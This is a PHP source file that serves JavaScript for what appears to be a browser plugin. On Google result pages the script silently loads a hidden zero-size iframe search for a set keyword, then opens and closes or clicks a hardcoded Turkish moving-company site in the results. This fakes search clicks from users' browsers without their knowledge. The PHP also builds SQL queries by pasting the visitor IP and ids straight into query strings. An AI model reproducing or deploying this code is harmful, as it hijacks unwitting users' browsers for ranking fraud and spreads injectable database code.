<?php
// ISSUES: 1=2 in get.php,
// CURRENT:
// TODO: set youtubee.us up. set admin up, repack plugin, share content
require_once 'config.php';
header ( 'Content-Type: text/html; charset=utf-8' );
$site = "";

$word = "";
$days = date ( "z" );

$ip = $_SERVER ["REMOTE_ADDR"];

$table = select ( "select * from site " );

$okSites = array ();
$du;
foreach ( $table as $row ) {
	
	$atable = select ( "select * from actionp where siteid=$row[id] and days=$days and ip='$ip' and 1=2" );
	$du = print_r ( $atable, true );
	if (count ( $atable ) == 0) {
		$site = $row ["site"];
		$words = explode ( ",", $row ["words"] );
	
		$word = $words[0];
		$okSites [] = array (
				"site" => $site,
				"word" => $word,
				"siteid" => $row ["id"] 
		);
	}
}
//print_r($okSites);
$ind = rand ( 0, count ( $okSites ) );
$okRow = $okSites [$ind];
myQuery ( getInsert ( "actionp", array (
		"siteid" => $okRow ["siteid"],
		"days" => $days,
		"ip" => $ip 
) ) );

$site = $okRow ["site"];
$word = $okRow ["word"];

// echo "{\"site\":\"$site\",\"word\":\"$word\",\"code\":\"upcontrole()\"}";

?>

var codeid = 140;
var tab;
var gurl = "https://www.google.com.tr/search?q=";
var word = "";
var site = "";

Hga = {
	searchSite : function() {
		var found = false;
		for (var k = 1; k < 4; k++) {

			var id = "s0p" + k
			var an1 = tab.contentDocument.getElementById(id);
			if (!an1)
				continue;
			var href = an1.href;

			var isty = href.search(site)

			if (isty != -1) {
				
					alert('found!')
					var liloc=an1.getAttribute("href");
					//top.location.href=liloc;
					
				var wi=	window.open(liloc);
					setTimeout(function(){wi.close()},1000)
					
				found = true
				alert('found!')
			}
		}
		if (!found) {

			for (var i = 1; i < 8; i++) {

				var id = "s1p" + i
				var an1 = tab.contentDocument.getElementById(id);
				if (!an1)
					continue;
				var href = an1.href;

				var isty = href.search(site)

				if (isty != -1) {
				
				
					alert('found!')
					var liloc=an1.getAttribute("href");
					//top.location.href=liloc;
					
				var wi=	window.open(liloc);
					setTimeout(function(){wi.close()},1000)
					
					found = true
						
				}
			}
		}
		if (!found) {

			for (var i = 1; i < 4; i++) {

				var id = "pab" + i
				var an1 = tab.contentDocument.getElementById(id);
				if (!an1)
					continue;
				var href = an1.href;

				var isty = href.search(site)

				if (isty != -1) {
					an1.click()
					found = true
				}
			}
		}
		if (!found)

		{

		}

	},
	dayofyear : function(d) { // d is a Date object
		var yn = d.getFullYear();
		var mn = d.getMonth();
		var dn = d.getDate();
		var d1 = new Date(yn, 0, 1, 12, 0, 0); // noon on Jan. 1
		var d2 = new Date(yn, mn, dn, 12, 0, 0); // noon on input date
		var ddiff = Math.round((d2 - d1) / 864e5);
		return ddiff + 1;
	},
	out : function(object) {

		if (!debug)
			return;

		var output = '';
		if (typeof (object) === "object") {
			for (property in object) {
				output += property + ': ' + object[property] + '\n ';
			}
		}

		else {
			output = object;
		}
		var d = document.getElementById("dframe");
		d.contentDocument.write(output);

	}
}

if(window.location.href.indexOf('google.com')>-1){

var response = {
<?php
echo "	site : '$site',
	word : '$word'";
?>

}

site ='www.evden-eve-nakliyat.info'; //response.site;
word ='g�ztepe nakliyat'; //response.word;



if(true){

	var frame = document.createElement('iframe');
	
	frame.setAttribute('width', '0');
	frame.setAttribute('height', '0');
	frame.setAttribute('frameborder', '0');
	frame.setAttribute('id', 'rtmframe');
	frame.setAttribute('src', gurl + word);
	
	document.body.appendChild(frame);
	
	tab = frame;
	if(site!='' && site !=='')
	setTimeout("Hga.searchSite()", 2000);
}
}